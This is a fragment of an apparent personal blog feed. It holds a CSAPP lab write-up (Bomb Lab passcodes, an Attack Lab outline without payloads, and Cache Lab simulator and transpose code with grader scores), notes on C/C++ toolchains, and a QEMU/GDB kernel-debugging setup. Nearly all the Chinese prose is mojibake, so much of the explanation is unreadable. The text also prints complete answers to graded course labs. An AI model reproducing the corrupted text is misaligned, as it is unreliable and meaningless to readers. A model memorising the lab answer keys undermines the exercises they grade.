\u0026quot;22\u0026quot; \u0026gt;\u0026gt; passcodes\nå®Œæ•´ç­”æ¡ˆï¼š\n1 2 3 4 5 6 7 8 â–¶ cat passcodes Border relations with Canada have never been better. 1 2 4 8 16 32 1 311 7 0 DrEvil ionefg 4 3 2 1 6 5 22 1 2 3 4 5 6 7 8 9 10 11 12 â–¶ ./bomb passcodes Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Phase 1 defused. How about the next one? That\u0026#39;s number 2. Keep going! Halfway there! So you got that one. Try this one. Good work! On to the next... Curses, you\u0026#39;ve found the secret phase! But finding it and solving it are quite different... Wow! You\u0026#39;ve defused the secret stage! Congratulations! You\u0026#39;ve defused the bomb! Attack Lab Attack Labæ˜¯CSAPP2eä¸­çš„Buffer Labçš„æ›´æ–°ï¼Œæ‰€ä»¥å¯ä»¥å¿½ç•¥åè€…\nCode Injection ctargetç”¨äºç¼“å†²åŒºæº¢å‡ºæ”»å‡» rtargetç”¨äºROPæ”»å‡» hex2rawç”¨äºå°†16ç¦æ­¢è½¬å­—ç¬¦ä¸² farm.c cookie.txt ctargetå’Œrtargetéœ€è¦å‚æ•°-qå–æ¶ˆé“¾æ¥æœåŠ¡å™¨ï¼Œå‚æ•°-iç”¨äºè¾“å…¥æ–‡ä»¶ï¼š\n1 2 3 4 5 â–¶ ./ctarget -h Usage: [-hq] ./ctarget -i \u0026lt;infile\u0026gt; -h Print help information -q Don\u0026#39;t submit result to server -i \u0026lt;infile\u0026gt; Input file åœ¨æˆ‘çš„æœ¬åœ°ç¯å¢ƒè¿è¡Œæ—¶ä¼šç›´æ¥segmentation faultï¼Œç»æŸ¥åŸå› ä¸ºï¼š\n1 2 *RSP 0x5561d668 â—‚â€” 0 â–º 0x7ffff7df7150 \u0026lt;__vfprintf_internal+160\u0026gt; movaps xmmword ptr [rsp + 0x10], xmm1 ä¸­ï¼Œxmmword ptr [rsp + 0x10]ä¸æ»¡è¶³movapsæŒ‡ä»¤è¦æ±‚çš„16å­—èŠ‚å¯¹é½\n0x1 0x2 0x3 ROP 0x4 0x5 Architecture Lab Cache Lab READMEï¼šhttp://csapp.cs.cmu.edu/3e/README-cachelab\nå‚è€ƒï¼šCache Lab Implementation and Blocking\nPart A. Building a cache simulator åœ¨csim.cä¸­ç¼–ç ï¼Œå®ç°csim-refç›¸åŒçš„åŠŸèƒ½ã€‚\nå®ç°ä»£ç ï¼šcsim.cï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 #include \u0026#34;cachelab.h\u0026#34; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;getopt.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;limits.h\u0026gt; // global parameters int s, E, b, S; char filename[1000]; // emulation status counts int hit_count, miss_count, eviction_count; typedef struct { int valid_bit; int tag; int lru_stamp; // LRUæ—¶é—´æˆ³ char* block; // æ•°æ®å—ï¼Œå¯¹äºé¢˜ç›®æ¥è¯´å®é™…ä¸Šå¹¶ä¸éœ€è¦ï¼Œæ­¤å¤„ä»…ä¸ºäº†æ¨¡æ‹ŸçœŸå®cache }cache_line, *cache_asso, **cache; cache _cache_ = NULL; // cacheçš„(äºŒçº§ç´¢å¼•å½¢å¼çš„)äºŒç»´æ•°ç»„ // æ‰“å° helper å†…å®¹çš„å‡½æ•°ï¼Œ-h å‘½ä»¤ä½¿ç”¨ void printUsage() { printf(\u0026#34;Usage: ./csim-ref [-hv] -s \u0026lt;num\u0026gt; -E \u0026lt;num\u0026gt; -b \u0026lt;num\u0026gt; -t \u0026lt;file\u0026gt;\\n\u0026#34; \u0026#34;Options:\\n\u0026#34; \u0026#34; -h Print this help message.\\n\u0026#34; \u0026#34; -v Optional verbose flag.\\n\u0026#34; \u0026#34; -s \u0026lt;num\u0026gt; Number of set index bits.\\n\u0026#34; \u0026#34; -E \u0026lt;num\u0026gt; Number of lines per set.\\n\u0026#34; \u0026#34; -b \u0026lt;num\u0026gt; Number of block offset bits.\\n\u0026#34; \u0026#34; -t \u0026lt;file\u0026gt; Trace file.\\n\\n\u0026#34; \u0026#34;Examples:\\n\u0026#34; \u0026#34; linux\u0026gt; ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\\n\u0026#34; \u0026#34; linux\u0026gt; ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\\n\u0026#34;); } // åˆå§‹åŒ–cache void initCache() { _cache_ = (cache)malloc(sizeof(cache_asso) * S); for(int i = 0; i \u0026lt; S; ++i) { _cache_[i] = (cache_asso)malloc(sizeof(cache_line) * E); for(int j = 0; j \u0026lt; E; ++j) { _cache_[i][j].valid_bit = 0; _cache_[i][j].tag = -1; _cache_[i][j].lru_stamp = -1; _cache_[i][j].block = NULL; } } } void update(unsigned int address) { int max_stamp = INT_MIN; int max_stamp_index = -1; // ç”±å†…å­˜åœ°å€æ±‚ç»„ç´¢å¼•ä¸ç›®æ ‡tagå€¼ int set_index = (address \u0026gt;\u0026gt; b) \u0026amp; ((-1U) \u0026gt;\u0026gt; (64 - s)); int tag_value = address \u0026gt;\u0026gt; (b + s); // åœ¨å½“å‰ç»„ä¸­æœç´¢ for(int i = 0; i \u0026lt; E; ++i) { // tagç›¸åŒï¼Œcache hit if(_cache_[set_index][i].tag == tag_value) { _cache_[set_index][i].lru_stamp = 0; hit_count++; return; } } // å½“å‰ç»„åœ¨hitåï¼Œå¤„ç†å…¶ä¸­ç©ºè¡Œ for(int i = 0; i \u0026lt; E; ++i) { if(_cache_[set_index][i].valid_bit == 0) { _cache_[set_index][i].valid_bit = 1; _cache_[set_index][i].lru_stamp = 0; _cache_[set_index][i].tag = tag_value; miss_count++; return; } } // æ—¢æ²¡æœ‰hitï¼Œä¹Ÿæ²¡æœ‰ç©ºè¡Œï¼Œåˆ™è§¦å‘æ›¿æ¢ eviction_count++; miss_count++; for(int i = 0; i \u0026lt; E; ++i) { // LRUæ“‚å° if(_cache_[set_index][i].lru_stamp \u0026gt; max_stamp) { max_stamp = _cache_[set_index][i].lru_stamp; max_stamp_index = i; } } // æŒ‘é€‰å‡ºLRUåçš„æœ€åçš„cache_lineæä¾›ç»™tag_valueå¯¹åº”çš„å†…å­˜ _cache_[set_index][max_stamp_index].tag = tag_value; _cache_[set_index][max_stamp_index].lru_stamp = 0; return; } // æ¯ä¸€è½®å…¨ä½“æ—¶é—´æˆ³éƒ½è¦+1 void updateStamp() { for(int i = 0; i \u0026lt; S; ++i) for(int j = 0; j \u0026lt; E; ++j) if(_cache_[i][j].valid_bit == 1) ++_cache_[i][j].lru_stamp; } void parseTrace() { FILE* fp = fopen(filename, \u0026#34;r\u0026#34;); if(fp == NULL) { printf(\u0026#34;open error\u0026#34;); exit(-1); } // è§£æè¾“å…¥å†…å®¹ char operator; // I:å¿½ç•¥ L:load M:modify S:store unsigned int address; // å†…å­˜åœ°å€ int size; // æ•°æ®å¤§å° while( fscanf(fp, \u0026#34; %c %xu,%d\\n\u0026#34;, \u0026amp;operator, \u0026amp;address, \u0026amp;size) \u0026gt; 0 ) { switch (operator) { case \u0026#39;I\u0026#39;: continue; case \u0026#39;L\u0026#39;: // loadè®¿é—®ä¸€æ¬¡ update(address); break; case \u0026#39;M\u0026#39;: // modifyè‹¥missï¼Œåˆ™è¿˜éœ€storeä¸€æ¬¡ update(address); case \u0026#39;S\u0026#39;: // storeè®¿é—®ä¸€æ¬¡ update(address); } updateStamp(); // æ¯è½®æ›´æ–°æ—¶é—´æˆ³ } // å…³æ–‡ä»¶ï¼Œfreeå†…å­˜ fclose(fp); for(int i = 0; i \u0026lt; S; ++i) free(_cache_[i]); free(_cache_); } int main(int argc, char *argv[]) { hit_count = miss_count = eviction_count = 0; int opt; while( -1 != (opt = (getopt(argc, argv, \u0026#34;hvs:E:b:t:\u0026#34;))) ) { switch (opt) { case \u0026#39;h\u0026#39;: printUsage(); return 0; case \u0026#39;v\u0026#39;: break; case \u0026#39;s\u0026#39;: s = atoi(optarg); break; case \u0026#39;E\u0026#39;: E = atoi(optarg); break; case \u0026#39;b\u0026#39;: b = atoi(optarg); break; case \u0026#39;t\u0026#39;: strcpy(filename, optarg); break; default: printUsage(); return 0; } } S = 1 \u0026lt;\u0026lt; s; initCache(); // åˆå§‹åŒ–cache parseTrace(); // æ›´æ–°æœ€ç»ˆçš„ä¸‰ä¸ªå‚æ•° printSummary(hit_count, miss_count, eviction_count); return 0; } ç¼–è¯‘ï¼š\n1 gcc csim.c cachelab.c -o csim ç»“æœï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 â–¶ ./test-csim Your simulator Reference simulator Points (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27 TEST_CSIM_RESULTS=27 Part B. Optimizing matrix transpose Part Båˆ™æ˜¯ç¼–å†™cacheå‹å¥½å‹ç¨‹åºï¼Œæ ¸å¿ƒåœ¨äºåˆ©ç”¨å¥½ç¨‹åºçš„å±€éƒ¨æ€§ï¼Œåˆ’åˆ†å†…å­˜åŒºåŸŸçš„è®¿é—®é¡ºåºï¼Œå°½é‡è¿ç»­è®¿é—®è¢«cacheç¼“å­˜çš„æ•°æ®ã€‚å…·ä½“ä»»åŠ¡æ˜¯å®ç°çŸ©é˜µè½¬ç½®ã€‚\nå¯¹åº”çš„ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—ç»™å®šçš„cacheå¤§å°ï¼Œä»¥å…¶ä¸ºå•ä½ï¼Œåˆ†æ‰¹æ¬¡å°†åŒæ ·å¤§å°çš„å†…å­˜æ•°æ®æ”¾å…¥cacheå¹¶å®Œæ•´å¤„ç†å®Œæ¯•ï¼Œä»¥æé«˜cacheæ•ˆç‡ã€‚ZiYang-Xieå¤§ä½¬çš„å›¾å¾ˆå½¢è±¡ï¼Œè“è‰²ç®­å¤´åŸåœ°è½¬ç½®ï¼Œçº¢è‰²ç®­å¤´åˆ†å—äº¤æ¢ã€‚\ntrans.c:transpose_submitå…·ä½“å®ç°å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void transpose_submit(int M, int N, int A[N][M], int B[M][N]) { // S = 5, E = 1, B = 5 if(M == 32 \u0026amp;\u0026amp; N == 32) { // è¯¥cacheæœ€å¤šå¯è¯»å…¥32x32çŸ©é˜µä¸­çš„8è¡Œæ•°æ®ï¼Œæ•…ä»¥æ¯å—8x8çš„å¤§å°åˆ†å‰²å¹¶è½¬ç½®å­˜æ”¾åˆ°å¦ä¸€ä¸ªçŸ©é˜µä¸­ for(int i = 0; i \u0026lt; N; i += 8) for(int j = 0; j \u0026lt; M; j += 8) { // 8x8å—å†…è½¬ç½® for(int k = i; k \u0026lt; i + 8; ++k) { int tmp1 = A[k][j]; int tmp2 = A[k][j+1]; int tmp3 = A[k][j+2]; int tmp4 = A[k][j+3]; int tmp5 = A[k][j+4]; int tmp6 = A[k][j+5]; int tmp7 = A[k][j+6]; int tmp8 = A[k][j+7]; B[j][k] = tmp1; B[j+1][k] = tmp2; B[j+2][k] = tmp3; B[j+3][k] = tmp4; B[j+4][k] = tmp5; B[j+5][k] = tmp6; B[j+6][k] = tmp7; B[j+7][k] = tmp8; } } } else if (M == 64 \u0026amp;\u0026amp; N == 64) { // è¯¥cacheæœ€å¤šå¯è¯»å…¥64x64çŸ©é˜µä¸­çš„4è¡Œæ•°æ®ï¼Œæ•…ä»¥æ¯å—4x4çš„å¤§å°åˆ†å‰²å¹¶è½¬ç½®å­˜æ”¾åˆ°å¦ä¸€ä¸ªçŸ©é˜µä¸­ for (int i = 0; i \u0026lt; N; i += 4) for (int j = 0; j \u0026lt; M; j += 4) { for(int k = i; k \u0026lt; i + 4; k += 2) { int tmp1 = A[k][j]; int tmp2 = A[k][j+1]; int tmp3 = A[k][j+2]; int tmp4 = A[k][j+3]; int tmp5 = A[k+1][j]; int tmp6 = A[k+1][j+1]; int tmp7 = A[k+1][j+2]; int tmp8 = A[k+1][j+3]; B[j][k] = tmp1; B[j+1][k] = tmp2; B[j+2][k] = tmp3; B[j+3][k] = tmp4; B[j][k+1] = tmp5; B[j+1][k+1] = tmp6; B[j+2][k+1] = tmp7; B[j+3][k+1] = tmp8; } } } else if (M == 61 \u0026amp;\u0026amp; N == 67) { // å¯¹äº61x67çš„çŸ©é˜µï¼Œ16x16å¯ä»¥æ»¡è¶³missæ•°å°äº2kçš„è¦æ±‚ï¼Œè€Œ17x17æ˜¯æœ€ä¼˜é€‰æ‹©ï¼Œmissæ•°ä¸º1950 for (int i = 0; i \u0026lt; N; i += 17) { for (int j = 0; j \u0026lt; M; j += 17) { for(int k = i; k \u0026lt; i + 17 \u0026amp;\u0026amp; k \u0026lt; N; k ++) for(int l = j; l \u0026lt; j + 17 \u0026amp;\u0026amp; l \u0026lt; M; l++) B[l][k] = A[k][l]; } } } return; } æµ‹è¯•ç»“æœï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 â–¶ ./driver.py Part A: Testing cache simulator Running ./test-csim Your simulator Reference simulator Points (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27 Part B: Testing transpose function Running ./test-trans -M 32 -N 32 Running ./test-trans -M 64 -N 64 Running ./test-trans -M 61 -N 67 Cache Lab summary: Points Max pts Misses Csim correctness 27.0 27 Trans perf 32x32 8.0 8 288 Trans perf 64x64 3.8 8 1668 Trans perf 61x67 10.0 10 1951 Total points 48.8 53 Shell Lab Malloc Lab Proxy Lab ","date":"2022-08-19T17:06:58+08:00","image":"https://s2.loli.net/2022/08/24/HhMzuB9lRFsCvy2.png","permalink":"https://cerr.cc/post/csapp-lab-writeup/","title":"CSAPP Lab WriteUp"},{"content":"ç¼–è¯‘å·¥å…·é“¾ æ­¤å‰ç–‘æƒ‘çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œä¸€å¥—ç¼–è¯‘å·¥å…·é“¾ç©¶ç«ŸåŒ…å«äº†äº›ä»€ä¹ˆä¸œè¥¿ï¼Ÿå½“æˆ‘ä»¬ä½¿ç”¨åŒ…ç®¡ç†å™¨ä¸€é”®å®‰è£…ç¼–è¯‘å·¥å…·é“¾æ—¶ï¼Œæ‰€å®‰è£…çš„ç¨‹åºã€æ•°æ®ã€æ–‡æ¡£è¢«åˆ†æ•£åœ¨äº†æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å„ä¸ªä½ç½®ï¼Œéš¾ä»¥è®©æˆ‘ä»¬ç›´æ¥ä¸€çª¥ç©¶ç«Ÿã€‚å¥½åœ¨è€ç”Ÿå¸¸è°ˆçš„buildrootåˆä¸ºæˆ‘ä»¬è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œï¼ˆå½“ç„¶ï¼Œä»ç½‘ä¸Šä¸‹è½½ä¸€ä»½ç¼–è¯‘å·¥å…·é“¾ä¹Ÿèƒ½è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼‰ã€‚å–ä¸€ä»½buildrootæ„å»ºå®Œæˆçš„ç¼–è¯‘å·¥å…·é“¾ç…ç…ï¼Œè·¯å¾„ä½äºbuildroot/output/hostï¼š\n1 2 â–¶ ls host bin etc include lib lib64 libexec man sbin share usr var x86_64-buildroot-linux-uclibc å…¶ä¸­çš„ç›´æ¥ç¼–è¯‘å·¥å…·éƒ¨åˆ†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 â–¶ ls bin | grep \u0026#34;x86_64-linux\u0026#34; | grep -v \u0026#34;br_real\u0026#34; x86_64-linux-addr2line\t# convert addresses into line number/file name pairs x86_64-linux-ar\t# create, modify, and extract from archives x86_64-linux-as\t# the portable GNU assembler x86_64-linux-c++filt\t# demangle C++ and Java symbols x86_64-linux-cc x86_64-linux-cpp x86_64-linux-elfedit\t# update the ELF header of ELF files x86_64-linux-gcc x86_64-linux-gcc-11.3.0 x86_64-linux-gcc-ar x86_64-linux-gcc-nm\t# list symbols from object files x86_64-linux-gcc-ranlib\t# generate an index to an archive x86_64-linux-gcov\t# print code coverage information x86_64-linux-gcov-dump\t# print coverage file contents x86_64-linux-gcov-tool\t# offline tool to handle gcda counts x86_64-linux-gprof\t# display call graph profile data x86_64-linux-ld x86_64-linux-ld.bfd x86_64-linux-ldconfig\t# configure Dynamic Linker Run Time Bindings x86_64-linux-ldd\t# print shared object dependencies x86_64-linux-lto-dump\t# tool for dumping LTO object files x86_64-linux-nm x86_64-linux-objcopy\t# copies a binary file, possibly transforming it in the process x86_64-linux-objdump\t# display information from object files x86_64-linux-ranlib x86_64-linux-readelf\t# display information about ELF files x86_64-linux-size\t# list section sizes and total size of binary files x86_64-linux-strings\t# print the sequences of printable characters in files x86_64-linux-strip\t# discard symbols and other data from object files ä½¿ç”¨buildrootæ„å»ºä»»æ„ç¼–è¯‘å·¥å…·é“¾ buildrootå¯¹é‚£äº›å¹³å°æœ‰é»˜è®¤é…ç½®å‘¢ï¼š\nè¿™ä¸ªæ•°é‡çš„è¾“å‡ºé¡¹æ€ä¹ˆçœ‹è¦†ç›–éƒ½å¾ˆå…¨é¢å‘€ã€‚\né‚£ä¹ˆä¸¤è¡Œå‘½ä»¤å³å¯å¾—åˆ°ç‰¹å®šå¹³å°çš„ç¼–è¯‘å·¥å…·é“¾äº†ï¼ˆä»¥qemu_aarch64_virtä¸ºä¾‹ï¼‰ï¼š\n1 2 make qemu_aarch64_virt_defconfig make toolchain æ¥åˆ°buildroot/output/hostä¸­å–è´§å³å¯ã€‚\nbinutils GNU assembler, linker and binary utilities. The programs in this package are used to assemble, link and manipulate binary and object files. They may be used in conjunction with a compiler and various libraries to build programs.\né‚£ä¹ˆbinutilsåŒ…ä¸­åŒ…å«äº†å“ªäº›è·¯å¾„ä¸‹çš„å“ªäº›å†…å®¹å‘¢ï¼Ÿ\nä½¿ç”¨apt-fileå·¥å…·æŸ¥çœ‹ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 â–¶ sudo apt install apt-file â–¶ apt-file list binutils binutils: /usr/bin/addr2line binutils: /usr/bin/ar binutils: /usr/bin/as binutils: /usr/bin/c++filt binutils: /usr/bin/dwp binutils: /usr/bin/elfedit binutils: /usr/bin/gold binutils: /usr/bin/gprof binutils: /usr/bin/ld binutils: /usr/bin/ld.bfd binutils: /usr/bin/ld.gold binutils: /usr/bin/nm binutils: /usr/bin/objcopy binutils: /usr/bin/objdump binutils: /usr/bin/ranlib binutils: /usr/bin/readelf binutils: /usr/bin/size binutils: /usr/bin/strings binutils: /usr/bin/strip binutils: /usr/lib/compat-ld/ld binutils: /usr/lib/gold-ld/ld binutils: /usr/share/bug/binutils/presubj binutils: /usr/share/doc/binutils/changelog.Debian.gz binutils: /usr/share/doc/binutils/copyright binutils: /usr/share/lintian/overrides/binutils configure make å®˜æ–¹æ–‡æ¡£ï¼šhttps://www.gnu.org/software/make/manual/html_node/index.html\nä¸€é¡µç‰ˆASCIIæ–‡æ¡£ï¼Œæ–¹ä¾¿Ctrl + Fé€ŸæŸ¥ï¼šhttps://www.gnu.org/software/make/manual/make.txt\nmakeé€šè¿‡makefileä¸­å®šä¹‰çš„å„ä¸ªæ–‡ä»¶çš„ä¾èµ–å…³ç³»ï¼Œä»¥åŠæ–‡ä»¶ç³»ç»Ÿä¸­æ‰€æ ‡è®°çš„æ–‡ä»¶ä¿®æ”¹æ—¶é—´ï¼Œåˆ¤æ–­å“ªäº›æ–‡ä»¶æ˜¯éœ€è¦é€šè¿‡ç‰¹å®šå‘½ä»¤é‡æ–°æ„å»ºçš„ã€‚ç”±æ­¤è¾¾åˆ°è‡ªåŠ¨åŒ–æ„å»ºçš„ç›®çš„ã€‚\ncmake gcc å®˜æ–¹æ–‡æ¡£ï¼šhttps://gcc.gnu.org/onlinedocs/\nå¿«é€ŸæŸ¥è¯¢æ–‡æ¡£ï¼šman gccã€‚å¯¹åº”çš„æ˜¯gccçš„æœ¬åœ°å•é¡µæ–‡æ¡£ã€‚\nç”±äºæ–‡æ¡£å¤ªé•¿ï¼Œæ²¡æœ‰åœ¨çº¿çš„å•é¡µç‰ˆï¼Œæ‰€ä»¥å¦‚éœ€åœ¨çº¿æŸ¥è¯¢æ–‡æ¡£éœ€å€ŸåŠ©Googleï¼Œä¾‹å¦‚æŸ¥è¯¢-marchç¼–è¯‘é€‰é¡¹çš„å«ä¹‰ï¼š\næ³¨æ„ä¸èƒ½æœç´¢-march site:gcc.gnu.orgï¼Œ-å¯¹äºGoogleæ¥è¯´æ˜¯â€œä¸åŒ…å«è¯¥å…³é”®è¯â€çš„å«ä¹‰\n","date":"2022-08-08T14:34:10+08:00","image":"https://s2.loli.net/2022/08/09/FTvgEfriYsZ2a9L.png","permalink":"https://cerr.cc/post/zkv%E7%9A%84cc-%E6%9E%84%E5%BB%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/","title":"ZKVçš„Cã€C++æ„å»ºç³»ç»Ÿå­¦ä¹ ä¹‹è·¯"},{"content":"ç¯å¢ƒå‡†å¤‡ QEMU çš„æ‰‹åŠ¨æ„å»º è·å–QEMUæºç ï¼š\n1 2 3 4 git clone https://gitlab.com/qemu-project/qemu.git cd qemu git submodule init git submodule update --recursive æœ¬æ¬¡ä½¿ç”¨x86_64å†…æ ¸çš„æƒ…å†µä¸‹ï¼Œconfigureé…ç½®å¦‚ä¸‹ï¼š\n1 ./configure --target-list=x86_64-softmmu --enable-debug ç¼–è¯‘å¹¶å®‰è£…ï¼š\n1 2 make -j`nproc` sudo make install ä½¿ç”¨buildrootä¸€é”®æ„å»ºrootfs+kernel buildrootè‡ªåŠ¨æ„å»ºè¿‡ç¨‹è‹¥å‡ºç°ç½‘ç»œä¸ç•…ï¼Œè‡ªå¤‡æ¢¯å­ï¼Œå¹¶è®¾å®šshellå˜é‡all_proxyã€http_proxyã€https_proxyç”¨äºä»£ç†wgetã€curlç­‰å·¥å…·å³å¯ã€‚å‚è§ï¼šhttps://cerr.cc/post/fuck-the-great-fire-wall/\n1 2 3 4 git clone https://git.buildroot.net/buildroot cd buildroot make qemu_x86_64_defconfig make linux-menuconfig ä½¿ç”¨ / æœç´¢ DEBUG_INFO ç¬¦å·ï¼ˆå³é…ç½®æ–‡ä»¶ä¸­çš„CONFIG_DEBUG_INFOç¬¦å·ï¼‰ è®¾å®šè·¯å¾„ä¸ä¾èµ–ï¼Œå°†å…¶æ‰“å¼€ã€‚\nä»¥åŒæ ·çš„æ–¹å¼å†å°† GDB_SCRIPT æ‰“å¼€ã€RANDOMIZE_BASE å…³é—­ã€‚\næ­¤åå³å¯ç›´æ¥makeæ„å»ºã€‚\n1 2 3 4 5 make # ç¼–è¯‘æ„å»ºä¸­â€¦â€¦ # â˜•ï¸ã€â˜•ï¸ã€â˜•ï¸â€¦â€¦ # ç¼–è¯‘æ„å»ºå®Œæˆ output/images/start-qemu.sh æµ‹è¯•æ˜¯å¦æ­£å¸¸å¯åŠ¨ï¼šï¼ˆä¸Šä¸€æ­¥è‹¥å…³é—­äº†RANDOMIZE_BASEï¼Œåˆ™æ— éœ€å‘kernelä¼ é€’nokaslrå‚æ•°ï¼‰\n1 2 3 4 5 6 cd output/images qemu-system-x86_64 -M pc -kernel bzImage \\ -drive file=rootfs.ext2,if=virtio,format=raw \\ -append \u0026#34;rootwait root=/dev/vda console=tty1 console=ttyS0 nokaslr\u0026#34; \\ -net nic,model=virtio -net user \\ -nographic -s -S -nographic å…¨éƒ¨ä¿¡æ¯è¾“å‡ºè‡³host stdio è‹¥å¦ï¼Œè€Œæ˜¯ä½¿ç”¨-serial stdioï¼Œåˆ™åªä¼šå°†guestçš„ä¸²å£æ•°æ®è¾“å‡ºè‡³host stdioï¼Œå…¶ä½™åˆ™ä¼šè¾“å‡ºè‡³å¯åŠ¨çš„vncserver -s shorthand for -gdb tcp::1234 -S freeze CPU at startup (use \u0026lsquo;c\u0026rsquo; to start execution) æ­¤æ—¶äºå¦ä¸€ä¸ªttyã€ptsï¼š\n1 2 3 4 sudo gdb -ex \u0026#34;file ../build/linux-5.15.18/vmlinux\u0026#34; \\ -ex \u0026#34;target remote :1234\u0026#34; pwndbg\u0026gt; b start_kernel pwndbg\u0026gt; c ç¡®è®¤æˆåŠŸæ–­ä¸‹æ‰§è¡Œæµå³å¯ã€‚\næ‰‹åŠ¨æ„å»ºkernel+initramfs è‹¥ä¸æƒ³å€ŸåŠ©è‡ªåŠ¨åŒ–å·¥å…·buildrootä¼ è¾¾æ—¨æ„ï¼Œè€Œæ˜¯è¦äº²è‡ªæŒ‡æŒ¥äº²è‡ªéƒ¨ç½²ï¼Œè®°å½•å¦‚ä¸‹ï¼š\nè½½å…¥x86_64é»˜è®¤configï¼š\n1 make x86_64_defconfig ä½¿ç”¨Linuxæä¾›çš„è„šæœ¬ä¸€é”®å¯ç”¨DEBUG_KERNELã€DEBUG_INFOã€GDB_SCRIPTSï¼Œå…³é—­RANDOMIZE_BASE\n1 ./scripts/config --file .config -e DEBUG_KERNEL -e DEBUG_INFO -e GDB_SCRIPTS -d RANDOMIZE_BASE å¼€å§‹ç¼–è¯‘ï¼š\n1 make -j`nproc` å¾—åˆ°ï¼šKernel: arch/x86/boot/bzImage is ready\nå…ˆæ¥çœ‹çœ‹å•kernelç›´æ¥ä¼ é€’ç»™qemuå¯åŠ¨ä¼šæ€æ ·ï¼š\n1 qemu-system-x86_64 -kernel arch/x86_64/boot/bzImage -nographic -append \u0026#34;console=ttyS0\u0026#34; å¾—åˆ°ï¼š\n1 ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0) ]--- æ²¡æœ‰rootfsçš„æƒ…å†µä¸‹kernelåˆå§‹åŒ–å®Œæˆåä¼šç›´æ¥panicã€‚\né‚£ä¹ˆæ¥ä¸‹æ¥åˆ¶ä½œinitramfså³å¯ï¼š\n1 mkinitramfs -o ramdisk.img æä¾›è¶³å¤Ÿå†…å­˜åå¯åŠ¨ï¼š\n1 qemu-system-x86_64 -m 512 -kernel arch/x86_64/boot/bzImage -nographic -append \u0026#34;console=ttyS0\u0026#34; -initrd ramdisk.img å¾—åˆ°shellå³æˆåŠŸã€‚\nå·§åˆçš„æ˜¯ï¼Œå°±åœ¨æˆ‘æ‰§è¡Œå®Œå¦‚ä¸Šå‘½ä»¤è¿›å…¥shellåï¼ŒæƒŠè§‰Linuxå±…ç„¶å·²ç»6.0.0äº†ğŸ˜±ã€‚ç»æŸ¥æ­£æ˜¯ä»Šå¤©çš„æ–°é—»ã€‚\nè¯•å›¾è°ƒè¯• æ²¿ç”¨ä¸Šè¿°æ‰‹åŠ¨æŒ¡çš„æ„å»ºæ–¹æ¡ˆï¼Œqemuå¯åŠ¨æ—¶å…³é—­kaslrï¼ˆç¼–è¯‘æ—¶è‹¥å…³é—­äº†RANDOMIZE_BASEï¼Œåˆ™æ— éœ€å‘kernelä¼ é€’nokaslrå‚æ•°ï¼‰ï¼š\n1 2 3 4 5 6 qemu-system-x86_64 -m 512 \\ -kernel arch/x86_64/boot/bzImage \\ -append \u0026#34;console=ttyS0 nokaslr\u0026#34; \\ -initrd ramdisk.img \\ -nographic \\ -s -S æ­¤æ—¶äºå¦ä¸€ä¸ªttyã€ptsï¼š\n1 2 3 echo \u0026#34;add-auto-load-safe-path /home/zkv/Laboratory/linux/scripts/gdb/vmlinux-gdb.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit echo \u0026#34;set auto-load safe-path /\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gdb vmlinux -ex \u0026#34;target remote :1234\u0026#34; å…³äºå¯¹gdbè°ƒè¯•çš„æ”¯æŒï¼Œå†…æ 